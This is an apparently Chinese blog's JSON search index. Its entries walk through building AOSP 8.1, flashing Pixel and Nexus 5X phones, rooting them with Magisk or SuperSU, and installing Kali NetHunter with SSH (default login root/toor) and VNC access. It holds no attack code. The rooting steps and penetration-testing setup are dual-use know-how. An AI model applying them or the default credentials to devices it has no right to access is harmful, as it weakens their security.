[{"categories":["环境搭建"],"content":"Android源码环境搭建 ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:0:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"虚拟机配置 这里选择的虚拟机是Kali https://www.kali.org/get-kali/#kali-virtual-machines ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"基本配置 cpu这里给4核2线程,内存一般给12G(这里咱们内存大,直接给20G),也就是12288M.少于12G会报out of memory错误. 磁盘空间这里给450G ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:1","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"以root用户登录 Kali Linux虚拟机官方提供了一个默认账号:kali/kali,但是并没有提供root账号. 可以先用kali/kali进入虚拟机,执行以下命令设置root账号密码. sudo passwd root 进行重置root密码,重置密码需要输入两次. 重启虚拟机,用root账号登录. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:2","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"设置时区 dpkg-reconfigure tzdata 在弹出窗口选择 Asia-\u003eshanghai ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:3","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"字体安装 在/usr/share/fonts目录下,创建一个文件夹my_fonts 将ttf格式字体复制到/usr/share/fonts/my_fonts目录下 ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:4","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"切换shell为bash //这里我们要切换到bash,目前Kali默认是zsh //切换bash chsh -s /bin/bash 重启后生效. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:5","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"关闭息屏和休眠 ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:6","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"安装小工具 apt update apt install htop jnettop tree ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:7","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"新建分区 使用gparted这个软件,在unallocated部分右击,选择\"New\",按照默认即可,即可新建一个370G的分区. 点击选择Apply,应用到磁盘.然后将这个新建的磁盘给mount到某个文件夹: cd Desktop mkdir COMPILE mount /dev/sda3 COMPILE ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:8","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"源码下载 ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"概述 谷歌官方提供了Android每个版本的原生源码,其官网为: https://android.googlesource.com/ 由于谷歌官方的源码服务器搭建在国外,国内用户访问很卡顿,幸运的是国内有清华源和中科大源,存储着与谷歌官方提供一致的Android源码供国内开发者使用,其链接分别如下: https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/ http://mirrors.ustc.edu.cn/aosp/ 接下来以中科大源为例进行Android源码的下载. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:1","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"下载Repo Repo是Android官方推出的另一个版本管理工具,封装了一系列的Git命令.要想下载Android源码,必须先下载Repo工具. mkdir ~/bin PATH=~/bin:$PATH curl https://storage.googleapis.com/git-repo-downloads/repo \u003e ~/bin/repo chmod a+x ~/bin/repo ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:2","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"配置Git git config --global user.name \"Your name\" git config --global user.email \"you@example.com\" ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:3","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"同步源码 这里我们以获取特定版本的Android源码为例,可通过如下网址查Android版本. https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds //先达到指定目录,然后开始同步Android源码. cd /root/Desktop/COMPILE mkdir aosp810_r1 cd aosp810_r1/ //下载指定版本的Android源码,这里下载android-8.1.0_r1 repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-8.1.0_r1 repo sync 如果提示无法连接到gerrit.googlesource.com,将如下内容复制到你的~/.bashrc里. export REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo' ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:4","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"下载驱动包 在下述网址搜索上述下载的Android版本(android-8.1.0_r1),找到build ID. https://source.android.com/setup/start/build-numbers android-8.1.0_r1对应的build ID为OPM1.171019.011 在下述网址先定位到要刷入的手机型号(这里我目前使用的手机为Pixel sailfish),然后搜索上述build ID,定位驱动下载链接. https://developers.google.com/android/drivers //上述两个链接都要下载 https://dl.google.com/dl/android/aosp/google_devices-sailfish-opm1.171019.011-f3bafc8b.tgz https://dl.google.com/dl/android/aosp/qcom-sailfish-opm1.171019.011-247af472.tgz 下载驱动包到Android源码所在目录. 解压. tar zxvf google_devices-sailfish-opm1.171019.011-f3bafc8b.tgz tar zxvf qcom-sailfish-opm1.171019.011-247af472.tgz ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:3:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"准备编译环境 apt update apt install bison tree dpkg --add-architecture i386 apt update apt install libc6:i386 libncurses5:i386 libstdc++6:i386 libxml2-utils //安装OpenJdk8 wget https://download.java.net/openjdk/jdk8u41/ri/openjdk-8u41-b04-linux-x64-14_jan_2020.tar.gz //解压 tar zxvf openjdk-8u41-b04-linux-x64-14_jan_2020.tar.gz //编写~/.bashrc,添加环境变量 export JAVA_HOME=/root/Desktop/java-se-8u41-ri export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar //配置python2环境 //这里使用pyenv来安装python2的版本 //①配置pyenv构建环境 sudo apt-get update; sudo apt-get install make build-essential libssl-dev zlib1g-dev \\ libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \\ libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev //②下载pyenv proxychains git clone https://github.com/yyuu/pyenv.git ~/.pyenv //③配置pyenv环境变量 echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' \u003e\u003e~/.bashrc echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' \u003e\u003e~/.bashrc echo -e 'if command -v pyenv 1\u003e/dev/null 2\u003e\u00261; then\\n eval \"$(pyenv init --path)\"\\nfi'\u003e\u003e~/.bashrc source ~/.bashrc //④这里安装python2.7.16 PYTHON_CONFIGURE_OPTS=\"--disable-ipv6\" proxychains pyenv install 2.7.16 //⑤配置全局python版本 pyenv global 2.7.16 至此环境已经准备好了,到这里我们关机打个快照. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:4:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"源码编译 挂载磁盘. //重新开机后需要先挂载磁盘. mount /dev/sda3 COMPILE 新建10G的交换分区. dd if=/dev/zero of=swapfile bs=1M count=10240 //mkswap创建交换文件 mkswap swapfile //swapon激活 sudo swapon swapfile 在Android源码目录执行下述命令. //下述两个文件,就是上面驱动包解压出来的 //执行后,要按一直按着Enter键,直到出现需要用户输入\"I ACCEPT\"选项,输入I ACCEPT //如果一直按着Enter键,到了末尾也没见提示用户输入,就先按Ctrl+C然后按Ctrl+D,就可以看到提示用户输入了. ./extract-google_devices-sailfish.sh ./extract-qcom-sailfish.sh //编译安卓源码前执行以下命令 export LC_ALL=C //导入环境变量 source build/envsetup.sh //选择设备 lunch //这里我目前使用的手机为Pixel sailfish //选择的是 24 aosp_sailfish-userdebug 24 //编译 m -j4 这里需要提一点的就是与lunch命令相关的构建类型,根据下述Android官网内容显示,在编译的时候可以选择的类型分为user、userdebug以及eng.其中user类型编译出来的镜像是无Root权限的. https://source.android.com/setup/build/building#choose-a-target 然而在我们执行\"lunch\"命令之后,似乎没有发现user类型,那我们是否无法编译出一个无Root权限的镜像? 经过实践可知,如果在选择编译目标时将带有userdebug文字中的debug字段去掉,就可以编译出不带Root权限的镜像. //只需将上述编译流程中的lunch替换为下述语句即可. //下述语句对应的是24,lunch aosp_sailfish-userdebug,这里只是将debug字段去掉. lunch aosp_sailfish-user ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:5:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"自编译系统刷机 上述编译出来的系统镜像默认放在源码根目录的\"out/target/product/设备代号/“目录下(这里的设备代号即为Pixel对应的sailfish代号) 如果想要将编译出来的镜像刷入设备,还需要从Android镜像官网下载与我们上述源码编译下载的版本一致的镜像. Android镜像官网如下: https://developers.google.com/android/images 上面我们源码下载的镜像为android-8.1.0_r1对应的build ID为OPM1.171019.011,编译出的镜像适配Google Pixel代号为sailfish的设备.故我们要在上述Android镜像官网中找到Pixel sailfish对应的版本代号为OPM1.171019.011的镜像下载地址. 对应的链接地址如下: https://dl.google.com/dl/android/aosp/sailfish-opm1.171019.011-factory-56d15350.zip 接下来就是下载上述镜像,然后解压,用我们编译出来的img镜像文件进行替换,最后执行flash-all.sh脚本进行刷机. adb reboot bootloader ./flash-all.sh 至此,一个自定义的Android系统就成功编译并刷机成功了. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:6:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"将源码导入AS工具中 将Android源码导入Android Studio工具中,可以利用AS的智能提示,帮助我们在源码修改中避免一些拼写以及语法上的错误. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:7:0","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"下载AS 下载AndroidStudio. https://developer.android.google.cn/studio 解压并运行. 切换到android-studio/bin目录下,运行当前目录的studio.sh即可启动AndroidStudio. 创建程序桌面图标. //创建桌面图标 gedit /usr/share/applications/android-studio.desktop //添加以下内容 [Desktop Entry] Name=AndroidStudio Encoding=UTF-8 Exec=sh -c \"/root/softWares/android-studio/bin/studio.sh\" Icon=/root/softWares/android-studio/bin/studio.png StartupNotify=false Terminal=false Type=Application 执行完上述操作后,即可在菜单中找到AndroidStudio的桌面程序图标,右键可以添加到桌面. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:7:1","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"源码导入 接下来的命令均是在Android源码目录中执行. 执行下述命令,生成idegen.jar文件. source build/envsetup.sh mmm development/tools/idegen/ 执行下述命令,在源码根目录生成android.iml和android.ipr文件. development/tools/idegen/idegen.sh android.iml:包含源码导入AS时会被导入和排除的子目录文件夹. android.ipr:包含源码工程的具体配置、代码以及依赖的lib等信息. 用AS打开上述android.ipr文件,等待一会就可以看到导入成功的Android源码. ","date":"2022-06-26","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:7:2","tags":["Android源码"],"title":"Android源码环境搭建","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"移动设备环境准备 下面的流程以Nexus 5X为例. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:0:0","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"adb配置 从下述网址下载adb工具. https://developer.android.google.cn/studio/releases/platform-tools?hl=zh_cn 配置adb环境变量. gedit ~/.bashrc export PATH=$PATH:/root/platform-tools source ~/.bashrc ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:1:0","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"刷机 需要确保已解锁OEM,然后开始下面的流程. 从下述网址中选择要刷入的Android版本对应的build ID https://source.android.com/setup/start/build-numbers 这里我们选择的是android-8.1.0_r1对应的build ID为OPM1.171019.011. 从下述网址中找到准备刷入的设备对应的代号为上述build ID的镜像链接并下载. https://developers.google.com/android/images 这里我们的准备刷入的设备型号为bullhead for Nexus 5X //下载镜像 wget https://dl.google.com/dl/android/aosp/bullhead-opm1.171019.011-factory-3be6fd1c.zip 校验SHA-256 Checksum,必须与官网一致. openssl dgst -sha256 bullhead-opm1.171019.011-factory-3be6fd1c.zip 解压. 7z x bullhead-opm1.171019.011-factory-3be6fd1c.zip 进入bootloader界面. //方式一 adb reboot bootloader //方式二 1、将USB线断开,并确保手机有80%左右的电量. 2、将手机完全关机. 3、同时按住音量向下键和开机键. 4、手机将进入bootloader界面 5、手机用USB线连上电脑. cd到刚解压的文件夹下,执行./flash-all.sh脚本. 上述流程完毕之后,手机就会重启进入初始化状态,在完成语言、WiFi以及在\"开发者选项\"中打开Usb调试选项后,一台新的测试机就诞生了.但在联网之后会发现测试机的系统时间与计算机时间不一致以及提示\"此WLAN网络无法访问互联网\",可通过以下命令解决: adb shell settings put global captive_portal_http_url https://www.google.cn/generate_204 adb shell settings put global captive_portal_https_url https://www.google.cn/generate_204 adb shell settings put global ntp_server 1.hk.pool.ntp.org adb shell reboot ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:2:0","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"Root 下面的两种Root方式,Magisk和SuperSU任选其一即可. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:3:0","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"Magisk 安装Magisk,查看是否具有ramdisk. https://github.com/topjohnwu/Magisk 如果有ramdisk,就从Rom包中提取boot.img,否则提取recovery.img 将提取出来的镜像传输到手机中. adb push boot.img /sdcard 在手机中打开Magisk选择上述镜像文件进行修补. 在PC上将上述修补后的镜像导出. adb pull /sdcard/Download/magisk_patched-25000_njnb9.img 将修补后的镜像刷入手机中. //进入bootloader界面,执行下面命令 fastboot flash boot boot magisk_patched-25000_njnb9.img ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:3:1","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"SuperSU 下载SuperSU并推送到手机的sdcard目录下. https://supersuroot.org/download/ SR5-SuperSU-v2.82-SR5-20171001224502.zip adb push .\\SR5-SuperSU-v2.82-SR5-20171001224502.zip /sdcard 要使用SuperSu的方式进行Root,首先要安装Twrp. Twrp是一个开放源码软件的定制Recover映像,而Recovery指的是一种可以对安卓机内部的数据或系统进行修改的模式(类似于Win PE),在Recovery里我们可以挂载磁盘,修改系统分区,使用adb命令等一系列功能. 下载自己机型对应的Twrp. https://twrp.me/Devices/ twrp-3.5.0_9-0-bullhead.img 进入bootloader界面,将镜像刷进去. //Nexus 5X fastboot flash recovery twrp.img //Pixel fastboot flash boot twrp.img 进入recovey模式,稍等一会就会进入刚安装的Twrp系统. 进入Twrp界面后,滑动下方的\"Swipe to Allow Modifications\"按钮,进入Twrp主界面,然后点击\"Install\"按钮(默认进入sdcard目录),选择上面推进去的SuperSU压缩包,开始刷SuperSU. 完成上述步骤,手机重启以后就完成了root. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:3:2","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"Kali NetHunter Kali NetHunter是第一个针对移动设备的开源Android渗透测试平台,允许受支持的设备访问Kali工具集,可以执行在桌面端Kali上执行的一切命令,另外Kali NetHunter对Android的修改主要关于Android内核方面的内容,对平时的使用几乎不会产生任何影响,十分值得每一个Android逆向人员拥有. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:0","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"刷机 需要先使用上述SuperSU的方式完成Root. 在官网下载Kali NetHunter. https://www.kali.org/get-kali/#kali-mobile nethunter-2022.2b-bullhead-oreo-kalifs-full.zip.torrent 这里会发现Nexus 5X的设备只支持Oreo,而Oreo是Android8的代码,这与我们上面刷的系统镜像是一致的. 将下载的压缩包推送到手机的sdcard目录下 adb push .\\nethunter-2022.2b-bullhead-oreo-kalifs-full.zip /sdcard 进入bootloader界面. adb reboot bootloader 进入Twrp界面,单击\"Install\"按钮,选择上面推进去的压缩包,开始刷Kali NetHunter. 等待上述步骤执行完毕,手机重启之后,就完成了Kali NetHunter的刷机. 接下里就会发现,桌面多了NetHunter、NetHunter KeX、NetHunter终端等App. 需要注意的是,要使用其他NetHunter相关的App,需要先打开NetHunter并允许所有申请的权限,进入App主界面后,打开侧边栏,选择Kali Chroot Manager,就会自动安装Kali Chroot Manager.安装完毕后,单击START KALI CHROOT启动Chroot,接下面便可以使用NetHunter KeX和NetHunter终端了. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:1","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"开启SSH 此时可通过手机上的NetHunter终端App运行各种Android原生不支持的Linux命令,但在手机上使用终端命令,终究觉得屏幕过小,此时我们可以通过SSH连接手机,在PC上操作手机. 打开手机端的NetHunter,单击侧边栏的Kali Services. 勾选RunOnChrootStart. 接下来就可以在PC上利用SSH工具如XShell,来连接手机,运行Linux命令了. 指定手机端的IP,以及默认的账号密码root/toor即可 ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:2","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"图形化界面 Kali NetHunter为Android内置了一个图形化界面,在PC上可以通过VNC Viewer进行连接. 打开手机端的NetHunter,单击侧边栏的Kex Manager. 单击\"SETUP LOCAL SERVER\"按钮,设置VNC Viewer的密码,然后选择root用户,最后单击\"START SERVER\"按钮启动SERVER. 使用VNC Viewer进行连接,输入手机端的IP和端口(端口号为1),然后输入上面设置的密码就可以连接成功了. https://www.realvnc.com/en/connect/download/viewer/ VNC-Viewer.exe 